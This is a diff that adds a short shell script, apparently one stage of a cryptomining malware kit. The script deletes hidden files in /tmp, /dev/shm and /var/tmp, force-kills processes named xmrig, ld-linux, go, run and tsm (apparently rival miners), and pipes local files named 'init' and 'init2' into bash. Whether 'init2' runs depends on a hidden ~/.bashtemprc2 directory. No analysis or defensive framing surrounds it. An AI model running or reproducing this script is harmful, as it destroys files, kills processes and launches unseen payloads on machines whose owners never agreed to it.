@@ -1,0 +1,38 @@
+#!/bin/sh
+rm -rf /tmp/.FILE
+rm -rf /tmp/.FILE*
+rm -rf /dev/shm/.FILE*
+rm -rf /dev/shm/.FILE
+rm -rf /var/tmp/.FILE
+rm -rf /var/tmp/.FILE*
+rm -rf /tmp/nu.sh
+rm -rf /tmp/nu.*
+rm -rf /dev/shm/nu.sh
+rm -rf /dev/shm/nu.*
+rm -rf /tmp/.F*
+rm -rf /tmp/.x*
+rm -rf /tmp/tdd.sh
+
+pkill -9 go> .out
+pkill -9 run> .out
+pkill -9 tsm> .out
+kill -9 `ps x|grep run|grep -v grep|awk '{print $1}'`> .out
+kill -9 `ps x|grep go|grep -v grep|awk '{print $1}'`> .out
+kill -9 `ps x|grep tsm|grep -v grep|awk '{print $1}'`> .out
+
+killall -9 xmrig
+killall -9 ld-linux
+kill -9 `ps x|grep xmrig|grep -v grep|awk '{print $1}'`
+kill -9 `ps x|grep ld-linux|grep -v grep|awk '{print $1}'`
+cat init | bash
+
+sleep 10
+cd ~
+pwd > dir.dir
+dir=$(cat dir.dir)
+if [ -d "$dir/.bashtemprc2" ]; then
+	exit 0
+else
+	cat init2 | bash
+fi
+exit 0
